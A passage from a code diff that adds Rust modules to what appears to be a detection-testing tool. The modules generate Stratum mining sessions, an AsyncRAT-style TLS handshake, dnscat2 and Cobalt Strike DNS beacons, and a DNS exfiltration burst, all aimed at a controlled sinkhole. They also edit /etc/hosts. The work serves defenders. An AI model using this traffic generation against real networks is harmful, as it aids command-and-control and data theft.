+                        Err(e) => {
+                            warn!(
+                                "[T1071-IOC-HTTP] Failed to clean up /etc/hosts: {}",
+                                e
+                            );
+                        }
+                    }
+                } else {
+                    warn!(
+                        "[T1071-IOC-HTTP] Cannot clean up /etc/hosts without root privileges"
+                    );
+                    warn!(
+                        "[T1071-IOC-HTTP] Manually remove entries between {} and {}",
+                        HOSTS_MARKER_START, HOSTS_MARKER_END
+                    );
+                }
+            }
+            for artifact in artifacts {
+                if Path::new(artifact).exists() {
+                    if let Err(e) = fs::remove_file(artifact) {
+                        warn!(
+                            "[T1071-IOC-HTTP] Failed to remove {}: {}",
+                            artifact, e
+                        );
+                    } else {
+                        debug!("[T1071-IOC-HTTP] Removed: {}", artifact);
+                    }
+                }
+            }
+            info!("[T1071-IOC-HTTP] Cleanup complete");
+            Ok(())
+        })
+    }
+}
+
+pub struct SuspiciousDomainsStratum {}
+
+#[async_trait]
+impl AttackTechnique for SuspiciousDomainsStratum {
+    fn info(&self) -> Technique {
+        Technique {
+            id: "T1071-IOC-STRATUM".to_string(),
+            name: "Suspicious Domain Connections - Stratum Mining Protocol Simulation".to_string(),
+            description: "Simulates Stratum v1 cryptocurrency mining sessions to trigger \
+                mining-pool network detections. Connects to signalbench-controlled mining-pool \
+                hostnames on ports 3333 and 4444, sending the full Stratum JSON-RPC handshake: \
+                mining.subscribe -> set_difficulty + mining.notify -> mining.authorize -> \
+                set_difficulty + mining.notify + client.get_version -> 4x mining.submit + \
+                mining.notify (1s inter-round sleep) -> mining.ping/pong -> top-up sleep to reach \
+                >=5s total dwell. The >=5s bidirectional session causes Palo Alto PA-440 App-ID \
+                to classify traffic as stratum-mining."
+                .to_string(),
+            category: "COMMAND_AND_CONTROL".to_string(),
+            parameters: vec![TechniqueParameter {
+                name: "log_file".to_string(),
+                description: "Path to save session log".to_string(),
+                required: false,
+                default: Some("/tmp/signalbench_t1071_stratum.log".to_string()),
+            }],
+            detection: "Monitor for: outbound TCP connections to ports 3333 or 4444 with \
+                Stratum JSON-RPC payload (mining.subscribe, mining.authorize, mining.submit). \
+                Palo Alto App-ID classifies this traffic as stratum-mining after >=5s dwell."
+                .to_string(),
+            cleanup_support: true,
+            platforms: vec!["Linux".to_string()],
+            permissions: vec!["user".to_string()],
+            voltron_only: false,
+        }
+    }
+
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
+        Box::pin(async move {
+            let log_file = config
+                .parameters
+                .get("log_file")
+                .cloned()
+                .unwrap_or_else(|| "/tmp/signalbench_t1071_stratum.log".to_string());
+
+            if dry_run {
+                info!(
+                    "[DRY RUN] T1071-IOC-STRATUM: Would attempt full Stratum v1 sessions to {} \
+                     mining pool hosts on ports 3333/4444",
+                    STRATUM_MINING_DOMAINS.len()
+                );
+                for domain in STRATUM_MINING_DOMAINS {
+                    for port in STRATUM_PORTS {
+                        info!(
+                            "[DRY RUN] - {}:{} (subscribe -> authorize -> 4x submit -> ping/pong, >=5s dwell)",
+                            domain, port
+                        );
+                    }
+                }
+                return Ok(SimulationResult {
+                    technique_id: "T1071-IOC-STRATUM".to_string(),
+                    success: true,
+                    message: format!(
+                        "DRY RUN: Would run Stratum v1 sessions to {} hosts x {} ports",
+                        STRATUM_MINING_DOMAINS.len(),
+                        STRATUM_PORTS.len()
+                    ),
+                    artifacts: vec![log_file],
+                    cleanup_required: false,
+                });
+            }
+
+            let running_as_root = is_running_as_root();
+            let sinkhole_ip = resolve_sinkhole_ip().await;
+            let mut hosts_modified = false;
+
+            if running_as_root {
+                match add_hosts_entries(&sinkhole_ip) {
+                    Ok(added) => {
+                        hosts_modified = added;
+                        if added {
+                            println!("[OK] Added safe test entries to /etc/hosts");
+                        }
+                    }
+                    Err(e) => {
+                        warn!(
+                            "[T1071-IOC-STRATUM] Failed to add hosts entries: {}",
+                            e
+                        );
+                    }
+                }
+            }
+
+            let mut log = File::create(&log_file)
+                .map_err(|e| format!("Failed to create log file: {}", e))?;
+            writeln!(
+                log,
+                "# SignalBench T1071-IOC-STRATUM - Stratum Mining Protocol Simulation"
+            )
+            .unwrap();
+            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
+            writeln!(log, "# Sinkhole: {}", sinkhole_ip).unwrap();
+            writeln!(log, "# --------------------------------------------------------\n").unwrap();
+
+            println!("\n[T1071-IOC-STRATUM] Stratum Protocol Simulation");
+            println!("{}", "-".repeat(60));
+            println!("{:<50} OUTCOME", "TARGET");
+            println!("{}", "-".repeat(60));
+
+            writeln!(log, "=== Stratum Protocol Simulation ===").unwrap();
+            writeln!(log, "Ports: 3333, 4444").unwrap();
+            writeln!(log, "Protocol: Stratum JSON-RPC (cleartext TCP)").unwrap();
+            writeln!(log).unwrap();
+
+            let mut stratum_attempts: u32 = 0;
+            let mut stratum_connected: u32 = 0;
+
+            for &domain in STRATUM_MINING_DOMAINS {
+                let resolved_to_safe =
+                    domain_resolves_to_safe_ip(domain, &sinkhole_ip).await;
+                if !resolved_to_safe && running_as_root {
+                    warn!(
+                        "[T1071-IOC-STRATUM] {} did not resolve to {} via /etc/hosts - \
+                         using sinkhole IP directly",
+                        domain, sinkhole_ip
+                    );
+                }
+                let connect_host = if resolved_to_safe {
+                    domain.to_string()
+                } else {
+                    sinkhole_ip.clone()
+                };
+                let via_note = if resolved_to_safe {
+                    format!("via /etc/hosts -> {}", sinkhole_ip)
+                } else {
+                    format!("direct {}", sinkhole_ip)
+                };
+
+                for &port in STRATUM_PORTS {
+                    stratum_attempts += 1;
+                    let addr = format!("{}:{}", connect_host, port);
+                    let display = format!("{}:{}", domain, port);
+
+                    print!("  {:<48} ", display);
+                    writeln!(log, "--- {} ({}) ---", display, via_note).unwrap();
+                    writeln!(log, "Time: {}", chrono::Local::now()).unwrap();
+
+                    match async_timeout(
+                        Duration::from_secs(3),
+                        TcpStream::connect(&addr),
+                    )
+                    .await
+                    {
+                        Ok(Ok(stream)) => {
+                            stratum_connected += 1;
+                            println!("CONNECTED [{}]", via_note);
+                            writeln!(log, "TCP: CONNECTED").unwrap();
+
+                            let session_start = std::time::Instant::now();
+                            let (read_half, mut write_half) = stream.into_split();
+                            let mut reader = BufReader::new(read_half);
+
+                            match async_timeout(
+                                Duration::from_secs(2),
+                                write_half.write_all(STRATUM_SUBSCRIBE.as_bytes()),
+                            )
+                            .await
+                            {
+                                Ok(Ok(())) => {
+                                    writeln!(log, "Sent: mining.subscribe").unwrap();
+                                }
+                                Ok(Err(e)) => {
+                                    writeln!(
+                                        log,
+                                        "Sent: mining.subscribe (write error: {})",
+                                        e
+                                    )
+                                    .unwrap();
+                                }
+                                Err(_) => {
+                                    writeln!(
+                                        log,
+                                        "Sent: mining.subscribe (write timeout)"
+                                    )
+                                    .unwrap();
+                                }
+                            }
+                            let sub_lines =
+                                read_stratum_lines(&mut reader, 2, 5).await;
+                            let mut job_id = "sb00".to_string();
+                            for line in &sub_lines {
+                                writeln!(log, "Recv: {}", line).unwrap();
+                            }
+                            if let Some(id) = extract_notify_job_id(&sub_lines) {
+                                job_id = id;
+                            }
+
+                            match async_timeout(
+                                Duration::from_secs(2),
+                                write_half
+                                    .write_all(STRATUM_AUTHORIZE.as_bytes()),
+                            )
+                            .await
+                            {
+                                Ok(Ok(())) => {
+                                    writeln!(log, "Sent: mining.authorize").unwrap();
+                                }
+                                Ok(Err(e)) => {
+                                    writeln!(
+                                        log,
+                                        "Sent: mining.authorize (write error: {})",
+                                        e
+                                    )
+                                    .unwrap();
+                                }
+                                Err(_) => {
+                                    writeln!(
+                                        log,
+                                        "Sent: mining.authorize (write timeout)"
+                                    )
+                                    .unwrap();
+                                }
+                            }
+                            let auth_lines =
+                                read_stratum_lines(&mut reader, 2, 6).await;
+                            let mut saw_version_req = false;
+                            for line in &auth_lines {
+                                writeln!(log, "Recv: {}", line).unwrap();
+                                if line.contains("\"client.get_version\"") {
+                                    saw_version_req = true;
+                                }
+                            }
+                            if let Some(id) = extract_notify_job_id(&auth_lines) {
+                                job_id = id;
+                            }
+
+                            if saw_version_req {
+                                match async_timeout(
+                                    Duration::from_secs(2),
+                                    write_half.write_all(
+                                        STRATUM_CLIENT_VERSION_RESPONSE.as_bytes(),
+                                    ),
+                                )
+                                .await
+                                {
+                                    Ok(Ok(())) => {
+                                        writeln!(
+                                            log,
+                                            "Sent: client.get_version response"
+                                        )
+                                        .unwrap();
+                                    }
+                                    Ok(Err(e)) => {
+                                        writeln!(
+                                            log,
+                                            "Sent: client.get_version (write error: {})",
+                                            e
+                                        )
+                                        .unwrap();
+                                    }
+                                    Err(_) => {
+                                        writeln!(
+                                            log,
+                                            "Sent: client.get_version (write timeout)"
+                                        )
+                                        .unwrap();
+                                    }
+                                }
+                            }
+
+                            for round in 0u32..4 {
+                                let submit_id = round + 3;
+                                let nonce: u32 = rand::random();
+                                let submit_msg =
+                                    make_stratum_submit(submit_id, &job_id, nonce);
+                                match async_timeout(
+                                    Duration::from_secs(2),
+                                    write_half.write_all(submit_msg.as_bytes()),
+                                )
+                                .await
+                                {
+                                    Ok(Ok(())) => {
+                                        writeln!(
+                                            log,
+                                            "Sent: mining.submit round {} (job={}, nonce={:08x})",
+                                            round + 1,
+                                            job_id,
+                                            nonce
+                                        )
+                                        .unwrap();
+                                    }
+                                    Ok(Err(e)) => {
+                                        writeln!(
+                                            log,
+                                            "Sent: mining.submit round {} (write error: {})",
+                                            round + 1,
+                                            e
+                                        )
+                                        .unwrap();
+                                    }
+                                    Err(_) => {
+                                        writeln!(
+                                            log,
+                                            "Sent: mining.submit round {} (write timeout)",
+                                            round + 1
+                                        )
+                                        .unwrap();
+                                    }
+                                }
+                                let submit_lines =
+                                    read_stratum_lines(&mut reader, 2, 3).await;
+                                for line in &submit_lines {
+                                    writeln!(log, "Recv: {}", line).unwrap();
+                                }
+                                if let Some(id) =
+                                    extract_notify_job_id(&submit_lines)
+                                {
+                                    job_id = id;
+                                } else {
+                                    job_id = format!("sb{:02}", round + 2);
+                                }
+                                if round < 3 {
+                                    sleep(Duration::from_millis(1000)).await;
+                                }
+                            }
+
+                            match async_timeout(
+                                Duration::from_secs(2),
+                                write_half.write_all(STRATUM_PING.as_bytes()),
+                            )
+                            .await
+                            {
+                                Ok(Ok(())) => {
+                                    writeln!(log, "Sent: mining.ping").unwrap();
+                                }
+                                Ok(Err(e)) => {
+                                    writeln!(
+                                        log,
+                                        "Sent: mining.ping (write error: {})",
+                                        e
+                                    )
+                                    .unwrap();
+                                }
+                                Err(_) => {
+                                    writeln!(
+                                        log,
+                                        "Sent: mining.ping (write timeout)"
+                                    )
+                                    .unwrap();
+                                }
+                            }
+                            let pong_lines =
+                                read_stratum_lines(&mut reader, 2, 2).await;
+                            for line in &pong_lines {
+                                writeln!(log, "Recv: {}", line).unwrap();
+                            }
+
+                            let elapsed = session_start.elapsed();
+                            if elapsed < std::time::Duration::from_secs(5) {
+                                let top_up =
+                                    std::time::Duration::from_secs(5) - elapsed;
+                                sleep(Duration::from_millis(
+                                    top_up.as_millis() as u64,
+                                ))
+                                .await;
+                            }
+                            writeln!(
+                                log,
+                                "Session complete: {:.1}s dwell, job_id={}",
+                                session_start.elapsed().as_secs_f32(),
+                                job_id
+                            )
+                            .unwrap();
+                        }
+                        Ok(Err(e)) => {
+                            println!("REFUSED [{}]", via_note);
+                            writeln!(log, "TCP: REFUSED ({})", e).unwrap();
+                        }
+                        Err(_) => {
+                            println!("TIMEOUT [{}]", via_note);
+                            writeln!(log, "TCP: TIMEOUT").unwrap();
+                        }
+                    }
+                    writeln!(log).unwrap();
+                }
+            }
+
+            println!("{}", "-".repeat(60));
+            println!(
+                "[T1071-IOC-STRATUM] Stratum phase: {} attempts, {} connected",
+                stratum_attempts, stratum_connected
+            );
+            info!(
+                "[T1071-IOC-STRATUM] Complete: {} attempts, {} connected",
+                stratum_attempts, stratum_connected
+            );
+            writeln!(log, "=== Summary ===").unwrap();
+            writeln!(log, "Attempts: {}", stratum_attempts).unwrap();
+            writeln!(log, "Connected: {}", stratum_connected).unwrap();
+            writeln!(
+                log,
+                "Refused/Timeout: {}",
+                stratum_attempts - stratum_connected
+            )
+            .unwrap();
+
+            let mut artifacts = vec![log_file.clone()];
+            if hosts_modified {
+                artifacts.push(HOSTS_ARTIFACT_MARKER.to_string());
+            }
+
+            Ok(SimulationResult {
+                technique_id: "T1071-IOC-STRATUM".to_string(),
+                success: true,
+                message: format!(
+                    "Stratum v1 mining simulation: {} TCP attempts ({} connected) across \
+                     {} hosts x {} ports",
+                    stratum_attempts,
+                    stratum_connected,
+                    STRATUM_MINING_DOMAINS.len(),
+                    STRATUM_PORTS.len()
+                ),
+                artifacts,
+                cleanup_required: true,
+            })
+        })
+    }
+
+    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
+        Box::pin(async move {
+            debug!("[T1071-IOC-STRATUM] Starting cleanup");
+            if artifacts.contains(&HOSTS_ARTIFACT_MARKER.to_string()) {
+                if is_running_as_root() {
+                    match remove_hosts_entries() {
+                        Ok(()) => {
+                            info!("[T1071-IOC-STRATUM] Cleaned up /etc/hosts entries");
+                        }
+                        Err(e) => {
+                            warn!(
+                                "[T1071-IOC-STRATUM] Failed to clean up /etc/hosts: {}",
+                                e
+                            );
+                        }
+                    }
+                } else {
+                    warn!(
+                        "[T1071-IOC-STRATUM] Cannot clean up /etc/hosts without root"
+                    );
+                }
+            }
+            for artifact in artifacts {
+                if Path::new(artifact).exists() {
+                    if let Err(e) = fs::remove_file(artifact) {
+                        warn!(
+                            "[T1071-IOC-STRATUM] Failed to remove {}: {}",
+                            artifact, e
+                        );
+                    } else {
+                        debug!("[T1071-IOC-STRATUM] Removed: {}", artifact);
+                    }
+                }
+            }
+            info!("[T1071-IOC-STRATUM] Cleanup complete");
+            Ok(())
+        })
+    }
+}
+
+pub struct SuspiciousDomainsAsyncRat {}
+
+#[async_trait]
+impl AttackTechnique for SuspiciousDomainsAsyncRat {
+    fn info(&self) -> Technique {
+        Technique {
+            id: "T1071-IOC-ASYNCRAT".to_string(),
+            name: "Suspicious Domain Connections - AsyncRAT TLS Certificate Simulation"
+                .to_string(),
+            description: "Initiates a TLS 1.2 handshake to sinkhole:8888 via openssl s_client. \
+                The sinkhole presents a self-signed certificate with CN=AsyncRAT Server. \
+                TLS 1.2 is required: in TLS 1.3 the Certificate message is encrypted, making \
+                the CN= IOC invisible to PA-440 inline inspection without full SSL decryption. \
+                -tls1_2 forces the older record format so the Certificate appears in plaintext \
+                on the wire. SNI is set to asyncrat.signalbench.local."
+                .to_string(),
+            category: "COMMAND_AND_CONTROL".to_string(),
+            parameters: vec![
+                TechniqueParameter {
+                    name: "log_file".to_string(),
+                    description: "Path to save connection log".to_string(),
+                    required: false,
+                    default: Some("/tmp/signalbench_t1071_asyncrat.log".to_string()),
+                },
+                TechniqueParameter {
+                    name: "timeout".to_string(),
+                    description: "Connection timeout in seconds".to_string(),
+                    required: false,
+                    default: Some("3".to_string()),
+                },
+            ],
+            detection: "Monitor for: outbound TLS connections to non-standard port 8888, \
+                TLS 1.2 handshake with CN=AsyncRAT Server in the certificate (visible to \
+                inline inspection without SSL decryption)."
+                .to_string(),
+            cleanup_support: true,
+            platforms: vec!["Linux".to_string()],
+            permissions: vec!["user".to_string()],
+            voltron_only: false,
+        }
+    }
+
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
+        Box::pin(async move {
+            let log_file = config
+                .parameters
+                .get("log_file")
+                .cloned()
+                .unwrap_or_else(|| "/tmp/signalbench_t1071_asyncrat.log".to_string());
+            let timeout = config
+                .parameters
+                .get("timeout")
+                .and_then(|t| t.parse::<u32>().ok())
+                .unwrap_or(3);
+
+            if dry_run {
+                let sinkhole_ip = resolve_sinkhole_ip().await;
+                info!(
+                    "[DRY RUN] T1071-IOC-ASYNCRAT: Would attempt AsyncRAT TLS 1.2 handshake \
+                     to {}:8888 (CN=AsyncRAT Server, SNI=asyncrat.signalbench.local)",
+                    sinkhole_ip
+                );
+                return Ok(SimulationResult {
+                    technique_id: "T1071-IOC-ASYNCRAT".to_string(),
+                    success: true,
+                    message: format!(
+                        "DRY RUN: Would send TLS 1.2 handshake to {}:8888 (CN=AsyncRAT Server)",
+                        sinkhole_ip
+                    ),
+                    artifacts: vec![log_file],
+                    cleanup_required: false,
+                });
+            }
+
+            let sinkhole_ip = resolve_sinkhole_ip().await;
+
+            let mut log = File::create(&log_file)
+                .map_err(|e| format!("Failed to create log file: {}", e))?;
+            writeln!(
+                log,
+                "# SignalBench T1071-IOC-ASYNCRAT - AsyncRAT TLS Certificate Simulation"
+            )
+            .unwrap();
+            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
+            writeln!(log, "# Sinkhole: {}", sinkhole_ip).unwrap();
+            writeln!(log, "# --------------------------------------------------------\n").unwrap();
+
+            println!("\n[T1071-IOC-ASYNCRAT] AsyncRAT TLS Certificate Simulation");
+            println!("{}", "-".repeat(60));
+            writeln!(log, "=== AsyncRAT TLS ===").unwrap();
+            let asyncrat_addr = format!("{}:8888", sinkhole_ip);
+            writeln!(log, "Target: {}", asyncrat_addr).unwrap();
+            writeln!(log, "SNI: asyncrat.signalbench.local").unwrap();
+            print!("  {:<48} ", asyncrat_addr);
+
+            match async_timeout(
+                Duration::from_secs(u64::from(timeout) + 2),
+                Command::new("openssl")
+                    .args([
+                        "s_client",
+                        "-connect",
+                        &asyncrat_addr,
+                        "-tls1_2",
+                        "-brief",
+                        "-servername",
+                        "asyncrat.signalbench.local",
+                    ])
+                    .stdin(Stdio::null())
+                    .output(),
+            )
+            .await
+            {
+                Ok(Ok(output)) => {
+                    let stdout = String::from_utf8_lossy(&output.stdout);
+                    let ec = output.status.code().unwrap_or(-1);
+                    let cert_line = stdout
+                        .lines()
+                        .find(|l| {
+                            l.contains("subject")
+                                || l.contains("CN=")
+                                || l.contains("issuer")
+                        })
+                        .unwrap_or("(no cert info)");
+                    if ec == 0 || stdout.contains("CONNECTION ESTABLISHED") {
+                        println!("CONNECTED");
+                        writeln!(
+                            log,
+                            "AsyncRAT TLS: CONNECTED ({})",
+                            cert_line.trim()
+                        )
+                        .unwrap();
+                        info!(
+                            "[T1071-IOC-ASYNCRAT] TLS connected to {}: {}",
+                            asyncrat_addr,
+                            cert_line.trim()
+                        );
+                    } else {
+                        println!("ATTEMPTED (ec={})", ec);
+                        writeln!(
+                            log,
+                            "AsyncRAT TLS: ATTEMPTED (ec={}, {})",
+                            ec,
+                            cert_line.trim()
+                        )
+                        .unwrap();
+                        info!(
+                            "[T1071-IOC-ASYNCRAT] TLS attempted {}: ec={}",
+                            asyncrat_addr, ec
+                        );
+                    }
+                }
+                Ok(Err(e)) => {
+                    println!("ERROR ({})", e);
+                    writeln!(log, "AsyncRAT TLS: ERROR ({})", e).unwrap();
+                    debug!(
+                        "[T1071-IOC-ASYNCRAT] TLS error at {}: {} (openssl not installed?)",
+                        asyncrat_addr, e
+                    );
+                }
+                Err(_) => {
+                    println!("TIMEOUT");
+                    writeln!(log, "AsyncRAT TLS: TIMEOUT").unwrap();
+                    debug!(
+                        "[T1071-IOC-ASYNCRAT] TLS timeout at {}",
+                        asyncrat_addr
+                    );
+                }
+            }
+            println!("{}", "-".repeat(60));
+            info!(
+                "[T1071-IOC-ASYNCRAT] Complete: TLS 1.2 handshake to {}",
+                asyncrat_addr
+            );
+
+            Ok(SimulationResult {
+                technique_id: "T1071-IOC-ASYNCRAT".to_string(),
+                success: true,
+                message: format!(
+                    "AsyncRAT TLS 1.2 handshake to {} (CN=AsyncRAT Server, \
+                     SNI=asyncrat.signalbench.local)",
+                    asyncrat_addr
+                ),
+                artifacts: vec![log_file],
+                cleanup_required: true,
+            })
+        })
+    }
+
+    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
+        Box::pin(async move {
+            for artifact in artifacts {
+                if Path::new(artifact).exists() {
+                    if let Err(e) = fs::remove_file(artifact) {
+                        warn!(
+                            "[T1071-IOC-ASYNCRAT] Failed to remove {}: {}",
+                            artifact, e
+                        );
+                    } else {
+                        debug!("[T1071-IOC-ASYNCRAT] Removed: {}", artifact);
+                    }
+                }
+            }
+            info!("[T1071-IOC-ASYNCRAT] Cleanup complete");
+            Ok(())
+        })
+    }
+}
+
+pub struct SuspiciousDomainsDns {}
+
+#[async_trait]
+impl AttackTechnique for SuspiciousDomainsDns {
+    fn info(&self) -> Technique {
+        Technique {
+            id: "T1071-IOC-DNS".to_string(),
+            name: "Suspicious Domain Connections - Malware DNS Probe Simulation".to_string(),
+            description: "Sends raw UDP/53 DNS probes to the sinkhole: dnscat2 78-byte tunnel \
+                init packet (matching snort3-malware-cnc.rules MALWARE-CNC dnscat2 DNS tunneling \
+                initialization), Cobalt Strike QTYPE A beacon 27 bytes (sid:45906), Cobalt \
+                Strike QTYPE TXT beacon 27 bytes (sid:45907), and a T1048 high-volume exfil \
+                burst: 120 queries at 10 QPS, alternating A/TXT, each carrying 3 x 60-char \
+                URL-safe-base64 labels (45 raw bytes each, 135 raw bytes per query, 16,200 bytes \
+                encoded total) under t1048.signalbench.sigre.xyz. Total burst duration ~12 s, \
+                clearing the >15 KB single-domain exfil threshold."
+                .to_string(),
+            category: "COMMAND_AND_CONTROL".to_string(),
+            parameters: vec![TechniqueParameter {
+                name: "log_file".to_string(),
+                description: "Path to save probe log".to_string(),
+                required: false,
+                default: Some("/tmp/signalbench_t1071_dns.log".to_string()),
+            }],
+            detection: "Monitor for: raw UDP/53 packets matching dnscat2 tunnel init signature \
+                (78 bytes, 0x3C label prefix, 'dcat2!command'), Cobalt Strike DNS A/TXT beacons \
+                (sids 45906/45907, QNAME aaa.stage), and high-volume DNS queries (>120 \
+                queries/12s) using URL-safe-base64 encoded labels under a single subdomain \
+                (T1048 exfil threshold >15 KB)."
+                .to_string(),
+            cleanup_support: true,
+            platforms: vec!["Linux".to_string()],
+            permissions: vec!["user".to_string()],
+            voltron_only: false,
+        }
+    }
+
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
+        Box::pin(async move {
+            let log_file = config
+                .parameters
+                .get("log_file")
+                .cloned()
+                .unwrap_or_else(|| "/tmp/signalbench_t1071_dns.log".to_string());
+
+            if dry_run {
+                let sinkhole_ip = resolve_sinkhole_ip().await;
+                info!(
+                    "[DRY RUN] T1071-IOC-DNS: Would send dnscat2 DNS probe + CS A/TXT beacons + \
+                     T1048 ~16.2 KB exfil burst to {}:53",
+                    sinkhole_ip
+                );
+                return Ok(SimulationResult {
+                    technique_id: "T1071-IOC-DNS".to_string(),
+                    success: true,
+                    message: format!(
+                        "DRY RUN: Would send DNS probes (dnscat2 + CS A/TXT + T1048 exfil burst) \
+                         to {}:53",
+                        sinkhole_ip
+                    ),
+                    artifacts: vec![log_file],
+                    cleanup_required: false,
+                });
+            }
+
+            let sinkhole_ip = resolve_sinkhole_ip().await;
+
+            let mut log = File::create(&log_file)
+                .map_err(|e| format!("Failed to create log file: {}", e))?;
+            writeln!(
+                log,
+                "# SignalBench T1071-IOC-DNS - Malware DNS Probe Simulation"
+            )
+            .unwrap();
+            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
+            writeln!(log, "# Sinkhole: {}", sinkhole_ip).unwrap();
+            writeln!(log, "# --------------------------------------------------------\n").unwrap();
+
+            println!("\n[T1071-IOC-DNS] Malware DNS Probe Simulation");
+            println!("{}", "-".repeat(60));
+            writeln!(log, "=== DNS Probes ===").unwrap();
+            writeln!(log, "Target: {}:53 (UDP)", sinkhole_ip).unwrap();
+
+            let mut dns_sent: u32 = 0;
+            match UdpSocket::bind("0.0.0.0:0").await {
+                Ok(sock) => {
+                    let dns_target = format!("{}:53", sinkhole_ip);
+
+                    let dnscat2_pkt = build_dnscat2_dns_packet();
+                    match sock.send_to(&dnscat2_pkt, &dns_target).await {
+                        Ok(n) => {
+                            dns_sent += 1;
+                            writeln!(
+                                log,
+                                "dnscat2 DNS: {} bytes sent to {}",
+                                n, dns_target
+                            )
+                            .unwrap();
+                            info!(
+                                "[T1071-IOC-DNS] dnscat2 DNS probe: {} bytes to {}",
+                                n, dns_target
+                            );
+                            println!(
+                                "  [-->] dnscat2 DNS probe sent ({} bytes to {})",
+                                n, dns_target
+                            );
+                        }
+                        Err(e) => {
+                            writeln!(log, "dnscat2 DNS: ERROR ({})", e).unwrap();
+                            debug!("[T1071-IOC-DNS] dnscat2 DNS send error: {}", e);
+                        }
+                    }
+
+                    let cs_a_pkt = build_cobalt_strike_dns_packet(1);
+                    match sock.send_to(&cs_a_pkt, &dns_target).await {
+                        Ok(n) => {
+                            dns_sent += 1;
+                            writeln!(
+                                log,
+                                "CS DNS A: {} bytes sent to {}",
+                                n, dns_target
+                            )
+                            .unwrap();
+                            info!(
+                                "[T1071-IOC-DNS] CS DNS A beacon: {} bytes to {}",
+                                n, dns_target
+                            );
+                            println!(
+                                "  [-->] Cobalt Strike DNS A beacon sent ({} bytes to {})",
+                                n, dns_target
+                            );
+                        }
+                        Err(e) => {
+                            writeln!(log, "CS DNS A: ERROR ({})", e).unwrap();
+                            debug!("[T1071-IOC-DNS] CS DNS A send error: {}", e);
+                        }
+                    }
+
+                    let cs_txt_pkt = build_cobalt_strike_dns_packet(16);
+                    match sock.send_to(&cs_txt_pkt, &dns_target).await {
+                        Ok(n) => {
+                            dns_sent += 1;
+                            writeln!(
+                                log,
+                                "CS DNS TXT: {} bytes sent to {}",
+                                n, dns_target
+                            )
+                            .unwrap();
+                            info!(
+                                "[T1071-IOC-DNS] CS DNS TXT beacon: {} bytes to {}",
+                                n, dns_target
+                            );
+                            println!(
+                                "  [-->] Cobalt Strike DNS TXT beacon sent ({} bytes to {})",
+                                n, dns_target
+                            );
+                        }
+                        Err(e) => {
+                            writeln!(log, "CS DNS TXT: ERROR ({})", e).unwrap();
+                            debug!("[T1071-IOC-DNS] CS DNS TXT send error: {}", e);
+                        }
+                    }
+
+                    let mut hv_sent: u32 = 0;
+                    let mut hv_errors: u32 = 0;
+                    let mut hv_encoded_total: usize = 0;
+                    let hv_delay = Duration::from_millis(1000 / T1048_HV_QPS);
+                    for i in 0..T1048_HV_TOTAL_QUERIES {
+                        let qtype: u16 = if i % 2 == 0 { 1 } else { 16 };
+                        let txid: u16 =
+                            0x1000u16.wrapping_add((i & 0x0FFF) as u16);
+                        let (hv_pkt, encoded) =
+                            build_t1048_high_volume_exfil_packet(qtype, txid);
+                        match sock.send_to(&hv_pkt, &dns_target).await {
+                            Ok(_) => {
+                                hv_sent += 1;
+                                hv_encoded_total += encoded;
+                            }
+                            Err(e) => {
+                                hv_errors += 1;
+                                if hv_errors <= 3 {
+                                    debug!(
+                                        "[T1071-IOC-DNS] T1048 HV exfil send error: {}",
+                                        e
+                                    );
+                                }
+                            }
+                        }
+                        sleep(hv_delay).await;
+                    }
+                    dns_sent += hv_sent;
+                    writeln!(
+                        log,
+                        "T1048 HV exfil burst: {} queries sent ({} errors), {} bytes \
+                         encoded under t1048.signalbench.sigre.xyz",
+                        hv_sent, hv_errors, hv_encoded_total
+                    )
+                    .unwrap();
+                    info!(
+                        "[T1071-IOC-DNS] T1048 HV exfil burst: {} queries, {} bytes encoded",
+                        hv_sent, hv_encoded_total
+                    );
+                    println!(
+                        "  [-->] T1048 high-volume exfil burst: {} queries, {} bytes encoded \
+                         under t1048.signalbench.sigre.xyz",
+                        hv_sent, hv_encoded_total
+                    );
+                }
+                Err(e) => {
+                    writeln!(log, "UDP socket bind: ERROR ({})", e).unwrap();
+                    warn!("[T1071-IOC-DNS] Failed to bind UDP socket: {}", e);
+                }
+            }
+
+            println!("{}", "-".repeat(60));
+            println!(
+                "[T1071-IOC-DNS] DNS probe phase: {} packets sent to {}:53",
+                dns_sent, sinkhole_ip
+            );
+            writeln!(log, "DNS probes sent: {}", dns_sent).unwrap();
+            info!(
+                "[T1071-IOC-DNS] Complete: {} DNS packets sent to {}:53",
+                dns_sent, sinkhole_ip
+            );
+
+            Ok(SimulationResult {
+                technique_id: "T1071-IOC-DNS".to_string(),
+                success: true,
+                message: format!(
+                    "DNS probe simulation: {} packets sent to {}:53 \
+                     (dnscat2 + CS A/TXT + T1048 exfil burst)",
+                    dns_sent, sinkhole_ip
+                ),
+                artifacts: vec![log_file],
+                cleanup_required: true,
+            })
+        })
+    }
+
+    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
+        Box::pin(async move {
+            for artifact in artifacts {
+                if Path::new(artifact).exists() {
+                    if let Err(e) = fs::remove_file(artifact) {
+                        warn!(
+                            "[T1071-IOC-DNS] Failed to remove {}: {}",
+                            artifact, e
+                        );
+                    } else {
+                        debug!("[T1071-IOC-DNS] Removed: {}", artifact);
+                    }
+                }
+            }
+            info!("[T1071-IOC-DNS] Cleanup complete");
+            Ok(())
+        })
+    }
+}
+
+// ---------------------------------------------------------------------------
+// T1572-SOFTETHER — SoftEther / PacketiX VPN Protocol Tunneling
+// ---------------------------------------------------------------------------
+//
+// SoftEther VPN (originally PacketiX VPN) uses an HTTP-mode transport:
+// binary PACK-serialised messages are exchanged as HTTPS POST bodies to
+// /vpnsvc/connect.cgi on port 992.  PA-440 App-ID classifies the
+// bidirectional TLS + HTTP-PACK flow as "softether-vpn" / "PacketiX VPN"
+// (both labels appear in Palo Alto's App-ID database for the same protocol).
+//
+// Reference: Unit42 CL-STA-1062 / TinyRCT backdoor (2024).
+//            SoftEther source: github.com/SoftEtherVPN/SoftEtherVPN
+//            PACK wire format: src/Mayaqua/Pack.c
+//
+// Volume: 3 independent VPN sessions × 3 rounds each = 9 HTTPS POST
